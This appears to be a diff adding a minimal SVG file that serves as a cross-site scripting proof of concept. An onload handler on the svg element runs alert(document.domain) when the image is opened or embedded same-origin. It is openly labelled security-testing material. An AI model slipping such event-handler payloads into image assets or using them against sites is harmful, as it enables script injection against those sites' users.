@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- Minimal, human-readable SVG XSS PoC. Fires when the SVG is opened as a
+     top-level document or embedded same-origin via <object>/<iframe>/<embed>. -->
+<svg xmlns="http://www.w3.org/2000/svg" width="240" height="120"
+     onload="alert(document.domain)">
+  <rect width="240" height="120" fill="#0d1117"/>
+  <text x="120" y="66" fill="#39d353" font-family="monospace" font-size="20"
+        text-anchor="middle">XSS &#9889;</text>
+</svg>
